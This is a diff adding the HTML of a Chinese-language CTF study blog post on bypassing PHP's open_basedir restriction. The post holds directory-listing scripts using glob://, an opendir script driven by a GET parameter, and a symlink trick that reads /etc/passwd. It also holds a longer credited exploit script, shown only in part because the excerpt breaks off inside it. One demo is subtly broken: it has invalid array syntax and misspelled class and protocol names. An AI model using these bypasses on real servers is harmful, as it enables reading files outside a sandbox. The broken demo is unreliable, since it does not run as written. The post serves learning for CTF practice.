@@ -1,0 +1,851 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>Open_basedir绕过 - Delete&#39;s blog</title><meta name="Description" content=""><meta property="og:title" content="Open_basedir绕过" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://ML-hacker.github.io/posts/open_basedir%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-04-14T14:34:26+08:00" />
+<meta property="article:modified_time" content="2024-04-14T14:34:26+08:00" />
+
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Open_basedir绕过"/>
+<meta name="twitter:description" content=""/>
+<meta name="application-name" content="Delete&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="Delete&#39;s blog">
+
+<meta name="theme-color" content="#f8f8f8"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="canonical" href="http://ML-hacker.github.io/posts/open_basedir%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/" /><link rel="prev" href="http://ML-hacker.github.io/posts/python%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93%E4%B8%80/" /><link rel="next" href="http://ML-hacker.github.io/posts/filter-chain-learning/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Open_basedir绕过",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http://ML-hacker.github.io/posts/open_basedir%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/"
+        },"genre": "posts","keywords": "PHP, bypass","wordcount":  1084 ,
+        "url": "http://ML-hacker.github.io/posts/open_basedir%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/","datePublished": "2024-04-14T14:34:26+08:00","dateModified": "2024-04-14T14:34:26+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Delete"},"author": {
+                "@type": "Person",
+                "name": "Delete"
+            },"description": ""
+    }
+    </script></head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('' === 'light' || '' === 'dark' || '' === 'black') setTheme(''), saveTheme(''); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Delete&#39;s blog"><span id="desktop-header-typeit" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about"> About </a><a class="menu-item" href="/friend"> Friend </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="Switch Theme">
+                        <option value="light">Light</option>
+                        <option value="dark">Dark</option>
+                        <option value="black">Black</option>
+                        <option value="auto">Auto</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Delete&#39;s blog"><span id="mobile-header-typeit" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about" title="">About</a><a class="menu-item" href="/friend" title="">Friend</a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="Switch Theme">
+                    <option value="light">Light</option>
+                    <option value="dark">Dark</option>
+                    <option value="black">Black</option>
+                    <option value="auto">Auto</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Open_basedir绕过</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="https://github.com/ML-hacker" title="Author" target="_blank" rel="noopener noreferrer author" class="author">Delete</a>
+                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">category <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2024-04-14">2024-04-14</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2024-04-14">2024-04-14</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1084 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;6 minutes&nbsp;</div>
+        </div><div class="content" id="content"><h1 id="前言" class="headerLink">
+    <a href="#%e5%89%8d%e8%a8%80" class="header-mark"></a>前言</h1><p>emm最近刷题呢，之前都没有系统刷过题目所以有些知识点就没有学习，现在就来一点点补上，还是太菜了</p>
+<h1 id="introduction" class="headerLink">
+    <a href="#introduction" class="header-mark"></a>introduction</h1><p><strong>Open_basedir</strong>是PHP设置中为了防御PHP跨目录进行文件（目录）读写的方法，所有PHP中有关文件读、写的函数都会经过open_basedir的检查。Open_basedir实际上是一些目录的集合，在定义了open_basedir以后，php可以读写的文件、目录都将被限制在这些目录中。</p>
+<p>设置open_basedir的方法，在linux下，不同的目录由“:”分割，如“/var/www/:/tmp/”；在Windows下不同目录由“;”分割，如“c:/www;c:/windows/temp”。
+<figure><img
+        
+        loading="lazy"
+        src="/img/opendir/1.png"
+        srcset="/img/opendir/1.png, /img/opendir/1.png 1.5x, /img/opendir/1.png 2x"
+        alt="/img/opendir/1.png"
+        title="/img/opendir/1.png" ></figure>
+可以在<strong>php.ini</strong>配置文件中进行配置</p>
+<h1 id="globe伪协议" class="headerLink">
+    <a href="#globe%e4%bc%aa%e5%8d%8f%e8%ae%ae" class="header-mark"></a>globe://伪协议</h1><p>那么在使用这个协议之前那肯定得知道这个协议是什么吧，所以也是去看了一下php的doc <a href="https://www.php.net/manual/zh/wrappers.glob.php" target="_blank" rel="noopener noreferrer">https://www.php.net/manual/zh/wrappers.glob.php</a></p>
+<h3 id="simple-globe" class="headerLink">
+    <a href="#simple-globe" class="header-mark"></a>Simple Globe://</h3><p>可以看见官方给出的demo</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>  
+</span></span><span class="line"><span class="cl"><span class="c1">// 循环 ext/spl/examples/ 目录里所有 *.php 文件  
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 并打印文件名和文件尺寸  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$it</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DirectoryIterator</span><span class="p">(</span><span class="s2">&#34;glob://ext/spl/examples/*.php&#34;</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$it</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl"><span class="nx">printf</span><span class="p">(</span><span class="s2">&#34;%s: %.1FK</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nv">$f</span><span class="o">-&gt;</span><span class="na">getFilename</span><span class="p">(),</span> <span class="nv">$f</span><span class="o">-&gt;</span><span class="na">getSize</span><span class="p">()</span><span class="o">/</span><span class="mi">1024</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl"><span class="p">}</span>  
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个只做一个引入，因为单纯的使用globe伪协议是没有办法绕过的，并且不能列出前面的目录以及以外的文件，更不能读取文件内容所以单纯的使用并没有什么好玩的</p>
+<h3 id="diretorylterator--globe" class="headerLink">
+    <a href="#diretorylterator--globe" class="header-mark"></a>Diretorylterator + Globe://</h3><p>关于Diretorylterator这个类的一些介绍： <a href="https://www.php.net/manual/zh/class.directoryiterator.php" target="_blank" rel="noopener noreferrer">https://www.php.net/manual/zh/class.directoryiterator.php</a>
+php5中增加的一个类，为用户提供一个简单的查看目录的接口
+demo2:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$result</span> <span class="o">=</span> <span class="k">array</span><span class="p">{};</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$mulu</span> <span class="o">=</span><span class="k">new</span> <span class="nx">Diretorylterator</span><span class="p">(</span><span class="s2">&#34;globle:///*&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$mulu</span> <span class="k">as</span> <span class="nv">$a</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$result</span> <span class="o">=</span> <span class="nv">$a</span><span class="o">-&gt;</span><span class="na">__toString</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">sort</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$result</span> <span class="k">as</span> <span class="nv">$s</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;</span><span class="si">{</span><span class="nv">$s</span><span class="si">}</span><span class="s2">&lt;br/&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里自己打了一遍，因为不想贴别人的代码&hellip;（主要是自己打一遍比较好）,绕过条件：PHP&gt;5.3 &amp;&amp; Linux环境下才可</p>
+<h3 id="opendirreaddirglob" class="headerLink">
+    <a href="#opendirreaddirglob" class="header-mark"></a>opendir()+readdir()+glob://</h3><ul>
+<li>opendir()&ndash;&gt;打开目录</li>
+<li>readdir()-&gt;返回目录中下一个文件的文件名。文件名以在文件系统中的排序返回。</li>
+</ul>
+<p>所以脚本如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="nv">$b</span> <span class="o">=</span> <span class="nx">opendir</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">=</span> <span class="nx">readdir</span><span class="p">(</span><span class="nv">$b</span><span class="p">))</span> <span class="o">!==</span> <span class="k">false</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$file</span><span class="o">.</span><span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">closedir</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="scandirglob" class="headerLink">
+    <a href="#scandirglob" class="header-mark"></a>scandir()+glob://</h3><p>关于这个解法我不打算去看因为这个也是好像绕不了open_basedir的
+引用：“这种方法也只能列出根目录和open_basedir允许目录下的文件。“</p>
+<h1 id="symlink绕过" class="headerLink">
+    <a href="#symlink%e7%bb%95%e8%bf%87" class="header-mark"></a>symlink绕过</h1><p><code>symlink()</code>函数创建一个从指定名称连接的现存目标文件开始的符号连接。： <a href="https://www.php.net/manual/zh/function.symlink.php" target="_blank" rel="noopener noreferrer">https://www.php.net/manual/zh/function.symlink.php</a>
+用法：
+symlink(string $target, string $link): bool</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">mkdir</span><span class="p">(</span><span class="s2">&#34;A&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">chdir</span><span class="p">(</span><span class="s2">&#34;A&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">mkdir</span><span class="p">(</span><span class="s2">&#34;B&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">chdir</span><span class="p">(</span><span class="s2">&#34;B&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">mkdir</span><span class="p">(</span><span class="s2">&#34;C&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">chdir</span><span class="p">(</span><span class="s2">&#34;C&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">mkdir</span><span class="p">(</span><span class="s2">&#34;D&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">chdir</span><span class="p">(</span><span class="s2">&#34;D&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">chdir</span><span class="p">(</span><span class="s2">&#34;..&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">chdir</span><span class="p">(</span><span class="s2">&#34;..&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">chdir</span><span class="p">(</span><span class="s2">&#34;..&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">chdir</span><span class="p">(</span><span class="s2">&#34;..&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">symlink</span><span class="p">(</span><span class="s2">&#34;A/B/C/D&#34;</span><span class="p">,</span><span class="s2">&#34;SD&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">symlink</span><span class="p">(</span><span class="s2">&#34;SD/../../../../etc/passwd&#34;</span><span class="p">,</span><span class="s2">&#34;POC&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">unlink</span><span class="p">(</span><span class="s2">&#34;SD&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">mkdir</span><span class="p">(</span><span class="s2">&#34;SD&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里的原理就是通过软连接作为一个桥梁来进行绕过
+具体的思路如下：</p>
+<ul>
+<li>创建了A/B/C/D这个目录</li>
+<li>创建SD软链接到目录A/B/C/D</li>
+<li>然后让POC指向SD上面的目录这个时候因为返回后../../../../刚好回到open_basedir限制的html目录下面所以这里没毛病</li>
+<li>然后删除了SD软链接又创建了一个文件夹这个时候POC指向的就是:
+<strong>var/www/html/SD/../../../../etc/passwd</strong>从而进行绕过（这个思路确实好玩）
+exp哈哈哈哈哈哈哈哈哈也是贴贴</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="cm">/* * by phithon * From https://www.leavesongs.com * detail: http://cxsecurity.com/issue/WLB-2009110068 */</span>
+</span></span><span class="line"><span class="cl"><span class="nx">header</span><span class="p">(</span><span class="s1">&#39;content-type: text/plain&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;display_errors&#39;</span><span class="p">,</span> <span class="k">TRUE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">printf</span><span class="p">(</span><span class="s2">&#34;open_basedir: %s</span><span class="se">\n</span><span class="s2">php_version: %s</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nx">ini_get</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">),</span> <span class="nx">phpversion</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl"><span class="nx">printf</span><span class="p">(</span><span class="s2">&#34;disable_functions: %s</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nx">ini_get</span><span class="p">(</span><span class="s1">&#39;disable_functions&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$file</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;\\&#39;</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s1">&#39;/etc/passwd&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$relat_file</span> <span class="o">=</span> <span class="nx">getRelativePath</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$paths</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$name</span> <span class="o">=</span> <span class="nx">mt_rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">999</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$exp</span> <span class="o">=</span> <span class="nx">getRandStr</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nx">mkdir</span><span class="p">(</span><span class="nv">$name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">chdir</span><span class="p">(</span><span class="nv">$name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">1</span> <span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">count</span><span class="p">(</span><span class="nv">$paths</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span> <span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">mkdir</span><span class="p">(</span><span class="nv">$paths</span><span class="p">[</span><span class="nv">$i</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">chdir</span><span class="p">(</span><span class="nv">$paths</span><span class="p">[</span><span class="nv">$i</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">mkdir</span><span class="p">(</span><span class="nv">$paths</span><span class="p">[</span><span class="nv">$i</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">-=</span> <span class="mi">1</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="nx">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$paths</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="nv">$relat_file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$paths</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;..&#39;</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="nx">mkdir</span><span class="p">(</span><span class="nv">$name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">chdir</span><span class="p">(</span><span class="nv">$name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$j</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
